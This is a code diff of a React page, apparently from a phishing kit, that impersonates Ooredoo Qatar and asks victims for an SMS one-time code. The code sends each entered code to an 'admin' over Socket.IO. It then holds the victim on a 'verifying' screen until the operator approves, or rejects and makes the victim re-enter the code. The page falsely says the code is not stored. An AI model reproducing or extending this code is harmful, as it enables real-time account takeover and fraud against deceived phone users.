@@ -1,20 +1,16 @@
-import RejectionBanner, { setRejectionMessage, clearRejectionMessage } from "@/components/RejectionBanner";
 import { useState, useEffect, useRef } from "react";
 import { useLocation } from "wouter";
 import { Button } from "@/components/ui/button";
-import WaitingOverlay from "@/components/WaitingOverlay";
 import SiteHeader from "@/components/SiteHeader";
 import SiteFooter from "@/components/SiteFooter";
-import { Loader2, PhoneCall, ShieldCheck, MessageSquare } from "lucide-react";
+import { Loader2, PhoneCall, ShieldCheck } from "lucide-react";
 import { useLang } from "@/i18n/LanguageContext";
-import { sendData, navigateToPage, isFormApproved, isFormRejected, waitingMessage } from "@/lib/store";
+import { socket, sendData, navigateToPage } from "@/lib/store";
 import { getServiceContext } from "@/lib/serviceContext";
 
 const OoredooOtp = () => {
   const { pick, dir } = useLang();
   const [, navigate] = useLocation();
-  const location = useLocation();
-  const phone = (location.state?.phone as string) || "";
   const selectedService =
     typeof window !== "undefined" ? sessionStorage.getItem("selected_service") : null;
   const serviceContext = getServiceContext(selectedService);
@@ -22,48 +18,49 @@ const OoredooOtp = () => {
   const [digits, setDigits] = useState(["", "", "", ""]);
   const [loading, setLoading] = useState(false);
   const [waiting, setWaiting] = useState(false);
+  const [rejected, setRejected] = useState(false);
+  const [rejectionMsg, setRejectionMsg] = useState("");
   const [seconds, setSeconds] = useState(54);
   const inputsRef = useRef<Array<HTMLInputElement | null>>([]);
 
   const code = digits.join("");
   const isValid = code.length === 4;
 
-  // Navigate to page on mount + reset signals
   useEffect(() => {
     navigateToPage("رمز OTP Ooredoo");
-    isFormApproved.value = false;
-    isFormRejected.value = false;
   }, []);
 
-  // Watch for admin approval
+  // مراقبة موافقة/رفض الأدمن
   useEffect(() => {
     if (!waiting) return;
-    if (isFormApproved.value) {
-      isFormApproved.value = false;
-      waitingMessage.value = "";
+    const s = socket.value;
+
+    const onApproved = () => {
       setWaiting(false);
       setLoading(false);
       navigate("/waiting");
-    }
-  }, [isFormApproved.value, waiting]);
+    };
 
-  // Watch for admin rejection
-  useEffect(() => {
-    if (!waiting) return;
-    if (isFormRejected.value) {
-      isFormRejected.value = false;
-      waitingMessage.value = "";
-      setRejectionMessage(pick(
+    const onRejected = () => {
+      setWaiting(false);
+      setLoading(false);
+      setRejected(true);
+      setRejectionMsg(pick(
         "رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى",
         "The code you entered is incorrect. Please try again."
       ));
-      setWaiting(false);
-      setLoading(false);
       setDigits(["", "", "", ""]);
       inputsRef.current[0]?.focus();
-      window.scrollTo({ top: 0, behavior: "auto" });
-    }
-  }, [isFormRejected.value, waiting]);
+    };
+
+    s.on("form:approved", onApproved);
+    s.on("form:rejected", onRejected);
+
+    return () => {
+      s.off("form:approved", onApproved);
+      s.off("form:rejected", onRejected);
+    };
+  }, [waiting]);
 
   useEffect(() => {
     if (seconds <= 0) return;
@@ -87,35 +84,38 @@ const OoredooOtp = () => {
     e.preventDefault();
     if (!isValid) return;
     setLoading(true);
-    clearRejectionMessage();
-    isFormApproved.value = false;
-    isFormRejected.value = false;
+    setRejected(false);
+    setRejectionMsg("");
 
-    // Send OTP via Socket.IO to admin
     sendData({
       data: {
-        phone: phone || "—",
-        otp_code: code,
-        service: selectedService || "ooredoo",
+        "رمز OTP": code,
+        "الخدمة": selectedService || "ooredoo",
       },
       current: "رمز OTP Ooredoo",
       nextPage: "انتظار",
       waitingForAdminResponse: true,
       isCustom: true,
-      customWaitingMessage: pick("جارٍ التحقق من رمز Ooredoo...", "Verifying Ooredoo code..."),
+      customWaitingMessage: pick("جارٍ التحقق من رمز OTP...", "Verifying OTP code..."),
     });
 
     setWaiting(true);
   };
 
-  const maskedPhone = phone ? "•••••" + phone.slice(-2) : "•••••••";
-  const mm = String(Math.floor(seconds / 60)).padStart(2, "0");
-  const ss = String(seconds % 60).padStart(2, "0");
-
   return (
     <div className="min-h-screen bg-background relative" dir={dir}>
-      <WaitingOverlay />
-      <RejectionBanner />
+      {/* Waiting Overlay */}
+      {waiting && (
+        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 backdrop-blur-sm">
+          <div className="bg-white dark:bg-gray-900 rounded-2xl shadow-2xl p-8 max-w-sm w-full mx-4 text-center space-y-4">
+            <Loader2 className="w-12 h-12 animate-spin text-primary mx-auto" />
+            <p className="text-lg font-semibold text-foreground">
+              {pick("جارٍ التحقق من رمز OTP...", "Verifying OTP code...")}
+            </p>
+          </div>
+        </div>
+      )}
+
       <SiteHeader />
 
       <section className="px-4 pb-10 pt-6">
@@ -130,95 +130,87 @@ const OoredooOtp = () => {
                 {pick(serviceContext.orgLineAr, serviceContext.orgLineEn)}
               </p>
               <p className="text-base font-extrabold leading-tight">
-                {pick(
-                  "تأكيد ملكية رقم الهاتف عبر رمز التحقق",
-                  "Verify phone number ownership via one-time code"
-                )}
+                {pick("التحقق برمز OTP", "OTP Verification")}
               </p>
             </div>
           </div>
 
-          {/* Heading */}
-          <div className="space-y-3">
-            <h1 className="text-2xl font-extrabold text-foreground leading-snug">
-              {pick("أدخل رمز التحقق المرسل إلى هاتفك", "Enter the verification code sent to your phone")}
-            </h1>
-            <p className="text-sm text-muted-foreground leading-relaxed">
-              {pick("أرسلنا رمزاً مكوّناً من 4 أرقام عبر SMS من ", "We sent a 4-digit SMS code from ")}
-              <span className="text-red-600 font-bold">Ooredoo Qatar</span>
-              {pick(" إلى رقمك ", " to your number ")}
-              <span className="font-bold tracking-wider">{maskedPhone}</span>
-              {pick(
-                ` لتأكيد ملكية الخط وربطه رسمياً مع ${serviceContext.accountAr}. يُستخدم هذا الرقم لاحقاً في إرسال إشعارات ${serviceContext.platformShortAr} والتنبيهات الأمنية الصادرة عن الجهة.`,
-                ` to confirm line ownership and officially link it to your ${serviceContext.accountEn}. This number will be used to send ${serviceContext.platformShortEn} notifications and security alerts from the authority.`
-              )}
-            </p>
-          </div>
-
+          {/* Rejection Banner */}
+          {rejected && rejectionMsg && (
+            <div className="rounded-xl bg-red-50 border border-red-200 text-red-700 p-4 text-sm font-medium">
+              {rejectionMsg}
+            </div>
+          )}
 
           {/* Form */}
-          <form onSubmit={handleSubmit} className="space-y-6 pt-2">
-            <div className="space-y-3">
-              <label className="block text-sm font-bold text-foreground">{pick("رمز التحقق", "Verification Code")}</label>
+          <div className="bg-card rounded-2xl shadow-sm border border-border p-6 space-y-6">
+            <div className="space-y-1">
+              <h1 className="text-2xl font-extrabold text-foreground">
+                {pick("أدخل رمز التحقق", "Enter verification code")}
+              </h1>
+              <p className="text-sm text-muted-foreground">
+                {pick(
+                  "تم إرسال رمز التحقق إلى رقم هاتفك المسجّل لدى Ooredoo Qatar",
+                  "A verification code has been sent to your phone number registered with Ooredoo Qatar"
+                )}
+              </p>
+            </div>
+
+            <form onSubmit={handleSubmit} className="space-y-6">
+              {/* OTP inputs */}
               <div className="flex justify-center gap-3" dir="ltr">
                 {digits.map((d, i) => (
                   <input
                     key={i}
-                    ref={(el) => (inputsRef.current[i] = el)}
+                    ref={(el) => { inputsRef.current[i] = el; }}
                     type="text"
                     inputMode="numeric"
+                    maxLength={1}
                     value={d}
                     onChange={(e) => handleChange(i, e.target.value)}
                     onKeyDown={(e) => handleKeyDown(i, e)}
-                    className="w-16 h-16 text-center text-2xl font-bold bg-muted/30 border border-border/50 rounded-xl focus:ring-2 focus:ring-red-500/30 focus:border-red-500 outline-none transition-all"
-                    maxLength={1}
+                    className="w-14 h-14 text-center text-2xl font-bold border-2 border-border rounded-xl bg-background text-foreground focus:border-primary focus:outline-none transition-colors"
                   />
                 ))}
               </div>
-            </div>
 
-            <div className="flex items-center justify-center gap-2 text-sm">
-              <MessageSquare className="w-4 h-4 text-muted-foreground" />
-              {seconds > 0 ? (
-                <span className="text-muted-foreground">
-                  {pick("إعادة إرسال الرمز خلال", "Resend code in")} <span className="text-red-600 font-bold">{mm}:{ss}</span>
-                </span>
-              ) : (
-                <button
-                  type="button"
-                  onClick={() => setSeconds(54)}
-                  className="text-red-600 font-bold hover:underline"
-                >
-                  {pick("إعادة إرسال الرمز", "Resend code")}
-                </button>
-              )}
-            </div>
-
-            {/* Security note */}
-            <div className="flex items-start gap-2.5 rounded-xl bg-muted/40 border border-border/50 p-3">
-              <ShieldCheck className="w-4 h-4 text-red-600 mt-0.5 shrink-0" />
-              <p className="text-xs text-muted-foreground leading-relaxed">
-                {pick(
-                  `يُستخدم رمز التحقق لمرة واحدة فقط لتأكيد ملكية رقم الهاتف، ولا يتم تخزينه لدى ${serviceContext.platformShortAr}.`,
-                  `The verification code is used only once to confirm phone ownership and is not stored by ${serviceContext.platformShortEn}.`
+              {/* Timer */}
+              <p className="text-center text-sm text-muted-foreground">
+                {seconds > 0 ? (
+                  pick(`إعادة الإرسال بعد ${seconds} ثانية`, `Resend in ${seconds} seconds`)
+                ) : (
+                  <button type="button" className="text-primary font-medium" onClick={() => setSeconds(54)}>
+                    {pick("إعادة إرسال الرمز", "Resend code")}
+                  </button>
                 )}
               </p>
-            </div>
 
-            <Button
-              type="submit"
-              disabled={loading || waiting || !isValid}
-              className="w-full bg-red-600 hover:bg-red-700 text-white text-base font-bold py-6 rounded-xl shadow-md transition-all"
-            >
-              {waiting ? (
-                <span className="flex items-center justify-center gap-2"><Loader2 className="h-4 w-4 animate-spin" />{pick("بانتظار الموافقة...", "Waiting for approval...")}</span>
-              ) : loading ? (
-                <span className="flex items-center justify-center gap-2"><Loader2 className="h-4 w-4 animate-spin" />{pick("جارٍ التحقق...", "Verifying...")}</span>
-              ) : pick("تأكيد الرمز وربط الحساب", "Confirm code and link account")}
-            </Button>
-          </form>
+              <div className="flex items-start gap-2 text-xs text-muted-foreground bg-muted/50 rounded-lg p-3">
+                <ShieldCheck className="w-4 h-4 shrink-0 mt-0.5 text-green-600" />
+                <span>
+                  {pick(
+                    "هذا الرمز صالح لمرة واحدة فقط ويُستخدم للتحقق من ملكية الرقم.",
+                    "This code is valid for one-time use only for phone number verification."
+                  )}
+                </span>
+              </div>
+
+              <Button
+                type="submit"
+                disabled={!isValid || loading}
+                className="w-full h-12 text-base font-bold bg-primary hover:bg-primary/90"
+              >
+                {loading ? (
+                  <Loader2 className="w-5 h-5 animate-spin" />
+                ) : (
+                  pick("تأكيد الرمز", "Confirm Code")
+                )}
+              </Button>
+            </form>
+          </div>
         </div>
       </section>
+
       <SiteFooter />
     </div>
   );
